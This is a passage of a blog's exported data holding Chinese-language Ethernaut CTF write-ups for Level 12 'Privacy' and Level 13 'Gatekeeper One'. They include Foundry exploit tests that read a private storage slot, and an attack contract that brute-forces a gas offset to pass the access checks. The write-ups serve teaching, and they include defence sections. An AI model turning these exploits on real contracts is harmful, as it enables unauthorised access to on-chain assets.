href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>同样，链上是没有隐私。一切都是公开的，任何人都可以阅读</li>\n<li>合理安排你的存储空间，可以节省 gas</li>\n<li>EVM 使用 32 字节的存储槽，小于 32 字节的类型会被打包</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过存储布局分析找到目标数据的 slot 位置</li>\n<li>使用 RPC 调用或 Foundry cheatcodes 读取数据</li>\n<li>正确处理数据类型转换和数据打包</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>永远不要在链上存储明文敏感数据</li>\n<li>使用哈希、承诺方案或链下验证</li>\n<li>考虑使用加密存储解决方案</li>\n<li>合理设计存储布局以提高效率</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://solidity-by-example.org/hacks/accessing-private-data/\">Private data</a></li>\n<li><a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/\">EVM storage</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html\">Storage layout</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-12-Privacy-存储布局分析\"><a href=\"#🎯-Ethernaut-Level-12-Privacy-存储布局分析\" class=\"headerlink\" title=\"🎯 Ethernaut Level 12: Privacy - 存储布局分析\"></a>🎯 Ethernaut Level 12: Privacy - 存储布局分析</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/12\">Ethernaut Level 12 - Privacy</a><br><strong>攻击类型</strong>: 存储布局分析<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>要读取 <code>private</code> 数据，然后调用 <code>unlock</code> 函数。这个关卡进一步考验对 EVM 存储布局的理解，特别是静态数组和数据打包的处理。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg\" alt=\"Privacy Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"目标函数分析\"><a href=\"#目标函数分析\" class=\"headerlink\" title=\"目标函数分析\"></a>目标函数分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">    require(_key == bytes16(data[2]));  // 需要 data[2] 的 bytes16 版本</span><br><span class=\"line\">    locked = false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到，此处的条件是 <code>_key</code> 必须等于 <code>bytes16(data[2])</code>。那么我们如何访问 <code>data[2]</code> 呢？</p>\n<h3 id=\"复杂存储布局分析\"><a href=\"#复杂存储布局分析\" class=\"headerlink\" title=\"复杂存储布局分析\"></a>复杂存储布局分析</h3><p>合约的状态变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool public locked = true;</span><br><span class=\"line\">uint256 public ID = block.timestamp;</span><br><span class=\"line\">uint8 private flattening = 10;</span><br><span class=\"line\">uint8 private denomination = 255;</span><br><span class=\"line\">uint16 private awkwardness = uint16(block.timestamp);</span><br><span class=\"line\">bytes32[3] private data;</span><br></pre></td></tr></table></figure>\n\n<p>由于没有继承，存储从 slot 0 开始，带有 <code>locked</code> 变量，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>Slot</th>\n<th>Variable</th>\n<th>Type</th>\n<th>Size</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td><code>locked</code></td>\n<td><code>bool</code></td>\n<td>1 byte</td>\n<td><code>locked</code> 占用1个字节，但由于下一个值不适合剩下的31个字节，<code>locked</code> 占用了整个插槽</td>\n</tr>\n<tr>\n<td>1</td>\n<td><code>ID</code></td>\n<td><code>uint256</code></td>\n<td>32 bytes</td>\n<td><code>uint256</code> 占用32字节，所以是1个满槽</td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>flattening</code><br/><code>denomination</code><br/><code>awkwardness</code></td>\n<td><code>uint8</code><br/><code>uint8</code><br/><code>uint16</code></td>\n<td>1+1+2 bytes</td>\n<td>分别是1个字节+1个字节+2个字节，Solidity将它们打包到一个插槽中</td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>data[0]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td>静态数组启动一个新的存储槽，每个 <code>bytes32</code> 元素占用一个完整的槽</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>data[1]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>data[2]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td><strong>这个槽位就是 <code>data[2]</code></strong></td>\n</tr>\n</tbody></table>\n<p>通过这个详细的存储布局，我们可以看到 <code>data[2]</code> 存储在 slot 5 中。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/PrivacyFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PrivacyTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    PrivacyFactory privacyFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        privacyFactory = new PrivacyFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(privacyFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPrivacyExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        Privacy instance = Privacy(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证初始状态</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击：读取 slot 5 中的 data[2]</span><br><span class=\"line\">        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 转换为 bytes16 并解锁</span><br><span class=\"line\">        bytes16 key = bytes16(data2);</span><br><span class=\"line\">        instance.unlock(key);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交关卡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 额外测试：验证存储布局</span><br><span class=\"line\">    function testStorageLayout() public &#123;</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检查各个 slot 的内容</span><br><span class=\"line\">        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked</span><br><span class=\"line\">        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID</span><br><span class=\"line\">        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables</span><br><span class=\"line\">        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]</span><br><span class=\"line\">        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]</span><br><span class=\"line\">        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Slot 0 (locked):&quot;, uint256(slot0));</span><br><span class=\"line\">        console.log(&quot;Slot 1 (ID):&quot;, uint256(slot1));</span><br><span class=\"line\">        console.log(&quot;Slot 2 (packed):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot2);</span><br><span class=\"line\">        console.log(&quot;Slot 3 (data[0]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot3);</span><br><span class=\"line\">        console.log(&quot;Slot 4 (data[1]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot4);</span><br><span class=\"line\">        console.log(&quot;Slot 5 (data[2]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot5);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>分析存储布局</strong>：确定 <code>data[2]</code> 存储在 slot 5</li>\n<li><strong>读取存储</strong>：使用 <code>vm.load()</code> 读取 slot 5 的数据</li>\n<li><strong>数据转换</strong>：将 <code>bytes32</code> 转换为 <code>bytes16</code></li>\n<li><strong>调用 unlock</strong>：使用转换后的 key 解锁合约</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 读取 slot 5 中的 data[2]</span><br><span class=\"line\">bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\"></span><br><span class=\"line\">// 转换为 bytes16</span><br><span class=\"line\">bytes16 key = bytes16(data2);  // 取前16个字节</span><br><span class=\"line\"></span><br><span class=\"line\">// 解锁合约</span><br><span class=\"line\">instance.unlock(key);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-不要在链上存储敏感数据\"><a href=\"#1-不要在链上存储敏感数据\" class=\"headerlink\" title=\"1. 不要在链上存储敏感数据\"></a>1. 不要在链上存储敏感数据</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：私有数据存储在链上</span><br><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    bytes32[3] private secretData;  // 仍然可以被读取！</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">        require(_key == bytes16(secretData[2]));</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：使用哈希验证</span><br><span class=\"line\">contract SecureContract &#123;</span><br><span class=\"line\">    bytes32 private dataHash;  // 存储哈希而不是明文</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _data) &#123;</span><br><span class=\"line\">        dataHash = keccak256(abi.encodePacked(_data));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes32 _data) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_data)) == dataHash);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用承诺-揭示方案\"><a href=\"#2-使用承诺-揭示方案\" class=\"headerlink\" title=\"2. 使用承诺-揭示方案\"></a>2. 使用承诺-揭示方案</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitReveal &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    mapping(address =&gt; bool) private revealed;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第一阶段：提交哈希</span><br><span class=\"line\">    function commit(bytes32 _hashedData) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _hashedData;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第二阶段：揭示并验证</span><br><span class=\"line\">    function reveal(bytes32 _data, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        revealed[msg.sender] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"存储布局分析工具\"><a href=\"#存储布局分析工具\" class=\"headerlink\" title=\"存储布局分析工具\"></a>存储布局分析工具</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 forge inspect 查看存储布局</span></span><br><span class=\"line\">forge inspect &lt;ContractName&gt; storage-layout</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 cast 读取存储</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 web3.py 读取存储</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">data = w3.eth.get_storage_at(contract_address, 5)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据类型转换\"><a href=\"#数据类型转换\" class=\"headerlink\" title=\"数据类型转换\"></a>数据类型转换</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bytes32 到 bytes16 转换</span><br><span class=\"line\">bytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;</span><br><span class=\"line\">bytes16 halfData = bytes16(fullData);  // 取前16个字节</span><br><span class=\"line\"></span><br><span class=\"line\">// 数据打包解析</span><br><span class=\"line\">bytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;</span><br><span class=\"line\">uint8 flattening = uint8(packedData);           // 最后1字节</span><br><span class=\"line\">uint8 denomination = uint8(packedData &gt;&gt; 8);    // 倒数2字节  </span><br><span class=\"line\">uint16 awkwardness = uint16(packedData &gt;&gt; 16);  // 倒数3-4字节</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>同样，链上是没有隐私。一切都是公开的，任何人都可以阅读</li>\n<li>合理安排你的存储空间，可以节省 gas</li>\n<li>EVM 使用 32 字节的存储槽，小于 32 字节的类型会被打包</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过存储布局分析找到目标数据的 slot 位置</li>\n<li>使用 RPC 调用或 Foundry cheatcodes 读取数据</li>\n<li>正确处理数据类型转换和数据打包</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>永远不要在链上存储明文敏感数据</li>\n<li>使用哈希、承诺方案或链下验证</li>\n<li>考虑使用加密存储解决方案</li>\n<li>合理设计存储布局以提高效率</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://solidity-by-example.org/hacks/accessing-private-data/\">Private data</a></li>\n<li><a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/\">EVM storage</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html\">Storage layout</a></li>\n</ul>\n"},{"title":"Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换","date":"2025-01-25T08:10:00.000Z","updated":"2025-01-25T08:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习EVM中的Gas计算、类型转换和tx.origin的巧妙运用，掌握Gatekeeper One关卡的破解技巧。理解modifier的绕过方法和gasleft()的特性。","_content":"\n# 🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换\n\n> **关卡链接**: [Ethernaut Level 13 - Gatekeeper One](https://ethernaut.openzeppelin.com/level/13)  \n> **攻击类型**: Gas计算 / 类型转换  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n通过三个 `modifier` 的检测，成功调用 `enter` 函数，成为 `entrant`。\n\n![Gatekeeper One Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)\n\n## 🔍 漏洞分析\n\n要通过此关卡，我们需要调用 `enter(bytes8 _gateKey)` 函数，但必须绕过它的三个 `modifier`。让我们逐一分析。\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\n这个 `modifier` 要求 `msg.sender` 不等于 `tx.origin`。这是一种常见的检查，用于防止直接从外部账户（EOA）调用。为了绕过它，我们必须通过一个中间合约来调用 `enter` 函数。这样，`tx.origin` 将是我们的EOA地址，而 `msg.sender` 将是攻击合约的地址。\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  require(gasleft() % 8191 == 0);\n  _;\n}\n```\n\n这个 `modifier` 要求在执行到这里时，剩余的 `gas` 必须是 `8191` 的倍数。这是一个棘手的约束，因为 `gas` 的消耗会因操作码、Solidity版本和优化器设置而异。\n\n最直接的方法是进行暴力破解：通过一个循环，在调用 `enter` 函数时尝试不同的 `gas` 值，直到找到一个满足 `gasleft() % 8191 == 0` 的值。\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n  require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n  _;\n}\n```\n\n这个 `modifier` 对我们传入的 `_gateKey` (一个 `bytes8` 类型的值) 进行了三项检查：\n\n1.  `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`\n    *   `uint64(_gateKey)` 将 `bytes8` 转换为 `uint64`。\n    *   `uint32(...)` 会截断，只保留低32位。\n    *   `uint16(...)` 会截断，只保留低16位。\n    *   为了让两者相等，`_gateKey` 的第17位到第32位必须全为0。例如，`0x????????0000????`。\n\n2.  `uint32(uint64(_gateKey)) != uint64(_gateKey)`\n    *   这要求 `_gateKey` 的高32位不全为0。\n\n3.  `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`\n    *   `uint16(uint160(tx.origin))` 获取 `tx.origin` 地址的最低16位。\n    *   这要求 `_gateKey` 的低32位（经过第一次检查后，其实就是低16位）必须等于 `tx.origin` 的低16位。\n\n综合这三个条件，我们可以构造出 `_gateKey`：\n-   将 `tx.origin` (即我们的EOA地址) 的低16位作为 `_gateKey` 的低16位。\n-   确保 `_gateKey` 的17-32位为0。\n-   在 `_gateKey` 的高32位中设置至少一个非零位。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n这是我们的Foundry测试合约，它将部署攻击合约并调用 `enter` 函数。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/13_GatekeeperOne.sol\";\n\ncontract GatekeeperOneTest is Test {\n    GatekeeperOne instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperOne();\n        attacker = new Attack(address(instance));\n    }\n\n    function testattacker() public {\n        vm.startPrank(player1, player1);\n        // 使用试错法找到合适的gas值 (例如 268)\n        attacker.attack(268);\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\ncontract Attack is Test {\n    GatekeeperOne instance;\n\n    constructor(address fb) {\n        instance = GatekeeperOne(fb);\n    }\n\n    // 构造 gateKey 并使用指定的 gas 调用 enter 函数\n    function attack(uint256 gas) public {\n        // 构造满足 gateThree 的 key\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n\n        // 使用计算好的 gas 调用目标函数\n        instance.enter{gas: 8191 * 10 + gas}(gateKey);\n    }\n\n    // 用于暴力破解 gas 值的函数\n    function findGas() public {\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n        \n        for (uint256 i = 0; i < 8191; i++) {\n            try instance.enter{gas: 8191 * 10 + i}(gateKey) {\n                console.log(\"Found gas:\", i); // 实验得出 i = 268\n                return;\n            } catch {}\n        }\n        revert(\"No gas match found!\");\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **创建攻击合约**: 绕过 `gateOne` (`msg.sender != tx.origin`)。\n2.  **构造 `_gateKey`**:\n    *   获取 `tx.origin` 的低16位。\n    *   将其构造成一个 `bytes8` 值，满足 `gateThree` 的所有 `require` 条件。\n3.  **暴力破解 `gas`**:\n    *   编写一个循环，尝试不同的 `gas` 值来调用 `enter` 函数。\n    *   在 `Foundry` 测试中，我们可以通过 `try/catch` 捕获失败的调用，直到找到一个成功的 `gas` 值（例如，`gas` 偏移量为 `268`）。\n4.  **发起攻击**: 使用找到的 `gas` 值和构造的 `_gateKey` 从攻击合约中调用 `enter` 函数。\n\n## 🛡️ 防御措施\n\n1.  **避免复杂的 `gas` 检查**: `gasleft()` 的值是不可预测的，并且会随着EVM的更新而改变。不应将其用于关键的访问控制逻辑。\n2.  **简化类型转换逻辑**: 过于复杂的类型转换和位操作会使代码难以理解，并可能引入意想不到的漏洞。应保持逻辑清晰、直接。\n3.  **使用更安全的认证模式**: 不要依赖 `tx.origin` 或 `gas` 技巧。可以考虑使用数字签名、Merkle树或预言机等更强大的验证机制。\n\n## 🔧 相关工具和技术\n\n-   **Foundry `try/catch`**: 用于在测试中捕获和处理预期的 `revert`，非常适合暴力破解 `gas` 等场景。\n-   **位操作 (`|`, `&`)**: 在构造 `_gateKey` 时用于精确控制字节内容。\n-   **类型转换**: 深入理解Solidity中不同整数类型（`uint16`, `uint32`, `uint64`）和字节类型（`bytes8`）之间的转换规则至关重要。\n\n## 🎯 总结\n\n**核心概念**:\n-   `tx.origin` vs `msg.sender` 的区别是许多合约攻击的基础。\n-   `gasleft()` 的值是动态的，依赖它进行验证是脆弱的。\n-   Solidity中的类型转换遵循严格的规则，不正确的转换或截断是常见的漏洞来源。\n\n**攻击向量**:\n-   通过中间合约绕过 `tx.origin` 检查。\n-   通过暴力破解找到满足 `gasleft()` 模运算的 `gas` 值。\n-   通过逆向工程类型转换和位操作的 `require` 条件来构造一个有效的输入。\n\n**防御策略**:\n-   不要将 `gas` 消耗作为安全机制。\n-   保持验证逻辑的简单和直接。\n-   使用经过验证的、更强大的身份验证模式。\n\n## 📚 参考资料\n\n-   [Solidity 类型转换](https://docs.soliditylang.org/en/latest/types.html#conversions)\n-   [tx.origin vs msg.sender](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)","source":"_posts/ethernaut-level-13-gatekeeper-one.md","raw":"---\ntitle: 'Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换'\ndate: 2025-01-25 16:10:00\nupdated: 2025-01-25 16:10:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Gas Manipulation\n  - Type Casting\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习EVM中的Gas计算、类型转换和tx.origin的巧妙运用，掌握Gatekeeper One关卡的破解技巧。理解modifier的绕过方法和gasleft()的特性。\"\n---\n\n# 🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换\n\n> **关卡链接**: [Ethernaut Level 13 - Gatekeeper One](https://ethernaut.openzeppelin.com/level/13)  \n> **攻击类型**: Gas计算 / 类型转换  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n通过三个 `modifier` 的检测，成功调用 `enter` 函数，成为 `entrant`。\n\n![Gatekeeper One Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)\n\n## 🔍 漏洞分析\n\n要通过此关卡，我们需要调用 `enter(bytes8 _gateKey)` 函数，但必须绕过它的三个 `modifier`。让我们逐一分析。\n\n### 